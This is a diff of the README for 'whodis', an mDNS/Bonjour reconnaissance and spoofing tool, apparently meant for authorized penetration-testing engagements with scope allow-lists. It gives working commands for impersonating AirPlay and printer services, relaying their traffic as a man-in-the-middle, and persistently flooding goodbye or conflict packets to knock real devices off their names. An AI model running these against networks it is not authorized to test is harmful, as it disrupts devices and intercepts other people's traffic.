@@ -4,9 +4,12 @@ mDNS / Bonjour recon and spoof, in Rust. macOS first.
 
 ```
 whodis browse --fingerprint
-whodis probe _airplay._tcp.local.
-whodis spoof answers.toml --burst 3 --allow 192.168.1.0/24
-whodis flood goodbye Foo._airplay._tcp.local.
+whodis probe                                                  # service types on the LAN
+whodis enum BedroomTV.local.                                  # one host, all services
+whodis capture --pcap snap.pcap -t 60
+whodis spoof --template airplay --name FakeATV --ip 10.0.5.42 --relay 10.0.5.20:7000
+whodis flood goodbye Foo._airplay._tcp.local. --forever
+whodis report --out engagement.md
 ```
 
 ## Install
@@ -17,70 +20,75 @@ cargo install --path .
 
 ## Subcommands
 
-| Command  | What |
+| Command | What |
 |---|---|
-| `browse`  | Watch the LAN for mDNS announcements |
-| `probe`   | One-shot directed mDNS query |
+| `browse`  | Stream every mDNS event from the LAN |
+| `probe`   | Directed query or service-type list with no args |
 | `enum`    | Per-host service deep dive |
-| `spoof`   | Authoritative responder reading a TOML answer table |
-| `flood`   | Goodbye / conflict-rename floods |
-| `capture` | Write mDNS traffic to a pcap file |
-| `report`  | Markdown engagement report (service types + instance inventory) |
+| `capture` | Dump mDNS to a pcap file |
+| `spoof`   | Authoritative responder, optionally with a TCP relay |
+| `flood`   | Goodbye and conflict-rename floods |
+| `report`  | Markdown engagement report |
 
 ## Browse
 
-Listens on UDP/5353 (REUSEPORT, coexists with `mDNSResponder`) and emits one record per event. Goodbyes and TXT updates come through too.
-
 ```
 whodis browse                       # JSONL until Ctrl-C
-whodis browse --pretty              # human view, ANSI color on TTY
-whodis browse --fingerprint         # tag each instance with vendor / product
-whodis browse --once                # 5-second snapshot, exits clean
+whodis browse --pretty              # human view, color on TTY
+whodis browse --fingerprint         # tag instances with vendor / product
+whodis browse --once                # 5-second snapshot
 whodis browse -t 30                 # auto-exit after 30s
-whodis browse | jq -c 'select(.kind == "instance_found")'
 ```
 
 ## Probe
 
-Sends a directed query, collects answers for `--timeout` (default 3s), exits. Without a service type, lists what is on the LAN.
-
 ```
-whodis probe                                                     # discover service types and counts
-whodis probe _airplay._tcp.local.                                # all AirPlay receivers
-whodis probe _ipp._tcp.local. -t 5                               # printers, 5s window
-whodis probe _airplay._tcp.local. --instance "Living Room ATV"   # single instance
-whodis probe --host BedroomTV.local                              # resolve a hostname
+whodis probe                                          # service types + counts
+whodis probe _airplay._tcp.local.                     # all AirPlay receivers
+whodis probe _ipp._tcp.local. -t 5                    # printers, 5s window
+whodis probe _airplay._tcp.local. --instance "Living" # one specific instance
+whodis probe --host BedroomTV.local                   # resolve a hostname
 ```
 
 ## Enum
 
-Per-host deep dive. Lists every service that one host advertises by walking the DNS-SD meta-query then filtering SRV records by target.
+Pick one host, list every service it advertises.
 
-```sh
+```
 whodis enum BedroomTV.local.
-whodis enum 192-168-50-179.local. -t 8     # longer window for sluggish LANs
+whodis enum 192-168-50-179.local. -t 8
+```
+
+## Capture
+
+LINKTYPE_RAW pcap with synthesized IPv4 / UDP wrappers. Wireshark and tshark read it directly.
+
+```
+whodis capture --pcap engagement.pcap -t 60
+whodis capture --pcap engagement.pcap                # until Ctrl-C
+tshark -r engagement.pcap
 ```
 
 ## Spoof
 
-Runs an authoritative responder. Reads a TOML answer table, listens on 5353, replies with `aa` set, optionally bursts the response to win the race against `mDNSResponder`.
+Pick a template or hand-write a TOML answer table.
 
 ```
-whodis spoof answers.toml --burst 3 --allow 192.168.1.0/24
-whodis spoof answers.toml --allow-instance "Living Room ATV"
+whodis spoof --template airplay --name FakeATV --ip 10.0.5.42
+whodis spoof answers.toml --burst 3 --allow 10.0.5.0/24
 ```
 
-Built-in templates let you skip writing a TOML file for common service types. Pass `--template`, `--name`, and `--ip`:
+Templates: `airplay`, `raop`, `ipp`, `smb`, `ssh`, `googlecast`. Each generates the right `PTR` / `SRV` / `TXT` / `A` records for the named instance.
 
+`--relay HOST:PORT` adds a TCP bridge. whodis listens on every port the spoof advertises and forwards new connections to the real device. Combine with `flood conflict` for full discovery + traffic MITM. Connection events and byte counts log to stderr.
+
+```sh
+whodis spoof --template airplay --name FakeATV --ip 10.0.5.42 \
+    --allow 10.0.5.0/24 \
+    --relay 10.0.5.20:7000
 ```
-whodis spoof --template airplay --name "Conf Room" --ip 10.0.5.42
-whodis spoof --template ipp --name "Lobby Printer" --ip 10.0.5.50
-whodis spoof --template ssh --name "honeypot" --ip 10.0.5.99
-```
 
-Available templates: `airplay`, `raop`, `ipp`, `smb`, `ssh`, `googlecast`.
-
-`answers.toml` for a fake AirPlay receiver:
+Manual answer table (`answers.toml`):
 
 ```toml
 ttl = 120
@@ -104,33 +112,26 @@ txt = ["model=AppleTV11,1", "deviceid=AA:BB:CC:DD:EE:FF"]
 [[answer]]
 name = "Spoofed-AppleTV.local."
 qtype = "A"
-data = "192.168.1.42"
+data = "10.0.5.42"
 ```
 
-Supported `qtype` values: `A`, `AAAA`, `PTR`, `SRV`, `TXT`. The responder bundles related records as DNS additionals automatically (PTR responses include matching SRV / TXT / A / AAAA), so a single client query is enough to fully discover the spoofed instance.
-
-With `--relay HOST:PORT`, whodis additionally listens on every port advertised in the answer table's SRV records and bridges incoming TCP connections to HOST:PORT. Combined with `flood conflict` against the real target, this is a full discovery + traffic MITM.
-
-```sh
-# Spoof Apple TV in the AirPlay picker, bridge AirPlay traffic to the real one
-whodis spoof --template airplay --name FakeATV --ip 192.168.50.108 \
-    --allow 192.168.50.0/24 \
-    --relay 192.168.50.20:7000
-```
+Supported qtypes: `A`, `AAAA`, `PTR`, `SRV`, `TXT`. `PTR` responses bundle related `SRV` / `TXT` / `A` / `AAAA` as additionals so one client query fully hydrates the instance.
 
 ## Flood
 
-Disruptive. `goodbye` sends TTL=0 records to make neighbors re-announce (good for harvesting fresh TXT). `conflict` sends authoritative records that conflict with the target's claimed name, forcing a rename per RFC 6762 sec 9.
+Disruptive.
+
+- `goodbye` sends TTL=0 records, forces neighbors to re-announce. Good for harvesting fresh `TXT`.
+- `conflict` sends authoritative records claiming the target's name with different content. Per RFC 6762 §9 the legit device renames itself.
 
 ```
 whodis flood goodbye Foo._airplay._tcp.local.
-whodis flood goodbye --rate 10 Foo._airplay._tcp.local. Bar._ipp._tcp.local.
-whodis flood conflict Foo._airplay._tcp.local. --allow-instance Foo
 whodis flood goodbye Foo._airplay._tcp.local. --count 50
 whodis flood goodbye Foo._airplay._tcp.local. --forever
+whodis flood conflict Foo._airplay._tcp.local. --allow-instance Foo
 ```
 
-`--rate` caps packets per second (default 50, minimum 1). `--count N` sends N packets per target (default 1, minimum 1). `--forever` repeats until Ctrl-C; mutually exclusive with `--count`.
+`--rate N` caps packets per second (default 50, minimum 1). `--count N` is per-target (default 1, minimum 1). `--forever` runs until Ctrl-C and conflicts with `--count`. A mismatched allow-list logs a warn and exits non-zero.
 
 ## Capture
 
@@ -144,64 +145,25 @@ tshark -r engagement.pcap                        # inspect
 
 ## Report
 
-Run an inventory pass and write a Markdown engagement report.
-
-```sh
-whodis report --out engagement.md           # 10s window, default path
-whodis report -t 30 --out lan-snapshot.md   # longer inventory
-WHODIS_SCOPE=engagement.toml whodis report  # writes into scope's log_dir if set
-```
-
-The report contains:
-- a service-type summary table from the DNS-SD meta-query
-- an instance inventory with vendor/product fingerprints and TXT highlights
-- timestamps and tool version metadata
-
-Pair with `whodis capture --pcap engagement.pcap` for full packet evidence alongside the narrative report.
-
-## Demo: spoof, browse, flood together
-
-Three terminals using the `answers.toml` from the Spoof section.
-
-**Terminal 1** — start the spoof:
-
-```sh
-whodis spoof answers.toml --burst 3 --allow 192.168.50.0/24
-```
-
-**Terminal 2** — watch the LAN. Your fake AppleTV shows up next to anything real:
+Brief inventory pass, Markdown summary (service types, instance inventory with fingerprints, TXT highlights, timestamps).
 
 ```
-$ whodis browse --pretty --fingerprint
-   +  19:11:52  spoofed-appletv  _airplay._tcp...  spoofed-appletv.local.:7000  Apple AppleTV (tvOS)
+whodis report --out engagement.md
+whodis report -t 30 --out lan-snapshot.md
+WHODIS_SCOPE=engagement.toml whodis report          # writes into scope log_dir if set
 ```
 
-**Terminal 3** — flood the spoof. The spoof defends its own name immediately, so Terminal 2 sees the goodbye and the re-announce:
-
-```sh
-whodis flood goodbye Spoofed-AppleTV._airplay._tcp.local.
-```
-
-Back on Terminal 2:
-
-```
-   +  19:11:52  spoofed-appletv  _airplay._tcp...  spoofed-appletv.local.:7000  Apple AppleTV (tvOS)
-   -  19:11:53  spoofed-appletv._airplay....                                    goodbye
-   +  19:11:54  spoofed-appletv  _airplay._tcp...  spoofed-appletv.local.:7000  Apple AppleTV (tvOS)
-```
-
-Same recipe works against real LAN devices. Pick a target name from `whodis browse` and substitute it for the fqdn above.
+Pair with `whodis capture --pcap` for raw packet evidence alongside the narrative.
 
 ## Modes
 
 | Mode | When | Binds 5353 |
 |---|---|---|
-| QueryOnly     | `probe`          | no |
-| Listen        | `browse`         | yes (REUSEPORT) |
-| Authoritative | `spoof`, `flood` | yes (REUSEPORT) |
-| Custom        | tests            | configurable |
+| QueryOnly     | `probe`, `enum`                 | no |
+| Listen        | `browse`, `capture`, `report`   | yes (REUSEPORT) |
+| Authoritative | `spoof`, `flood`                | yes (REUSEPORT) |
 
-If 5353 won't bind, the error points at firewall or sudo. No silent fallback.
+`SO_REUSEPORT` lets us coexist with macOS `mDNSResponder`. If 5353 will not bind, the error points at firewall or sudo. No silent fallback.
 
 ## Output
 
@@ -209,22 +171,59 @@ JSONL on stdout by default. `--pretty` switches to human view (auto on a TTY). `
 
 ## Authorization
 
-`spoof` and `flood` accept `--allow CIDR` and `--allow-instance NAME` (both repeatable). Empty allow-list warns once and proceeds.
+`spoof` and `flood` accept `--allow CIDR` and `--allow-instance NAME`, both repeatable. An empty allow-list emits one warning and proceeds. A mismatched allow-list logs the blocked target and exits non-zero.
 
-## Scope file
-
-For an engagement, declare allow-lists once in a TOML scope file and pass it everywhere:
+For an engagement, declare scope once and reuse:
 
 ```toml
 # whodis-scope.toml
 allow_subnet   = ["10.0.5.0/24"]
 allow_instance = ["LivingRoomTV"]
-log_dir        = "./engagement-logs"   # used by `report` (planned)
+log_dir        = "./engagement-logs"
 ```
 
 ```sh
-whodis --scope whodis-scope.toml spoof airplay-takeover.toml
-WHODIS_SCOPE=whodis-scope.toml whodis flood conflict "LivingRoomTV._airplay._tcp.local." --forever
+whodis --scope whodis-scope.toml spoof airplay.toml
+WHODIS_SCOPE=whodis-scope.toml whodis flood conflict LivingRoomTV._airplay._tcp.local. --forever
 ```
 
-`--allow` and `--allow-instance` on the command line stack on top of the file's lists.
+CLI `--allow` flags stack on top of the scope file's lists.
+
+## Engagement workflow
+
+A real run. Define scope once. Capture continuously. Spoof and bridge a target. Push the real device off its name. Write the report.
+
+`whodis-scope.toml`:
+
+```toml
+allow_subnet   = ["10.0.5.0/24"]
+allow_instance = ["LivingRoomTV"]
+log_dir        = "./engagement-logs"
+```
+
+```sh
+mkdir -p engagement-logs
+export WHODIS_SCOPE=whodis-scope.toml
+
+# Capture every mDNS packet
+whodis capture --pcap engagement-logs/mdns.pcap &
+
+# Spoof the real Apple TV, bridge AirPlay traffic through us
+whodis spoof --template airplay --name LivingRoomTV --ip 10.0.5.50 \
+    --relay 10.0.5.20:7000 &
+
+# Persistently force the real device off its name
+whodis flood conflict LivingRoomTV._airplay._tcp.local. --forever --rate 20 &
+
+# Watch the LAN while you work
+whodis browse --pretty --fingerprint
+```
+
+When done:
+
+```sh
+kill %1 %2 %3
+whodis report --out engagement-logs/report.md
+```
+
+`engagement-logs/` ends up with `mdns.pcap`, `report.md`, plus whatever stderr you redirected from the background processes.
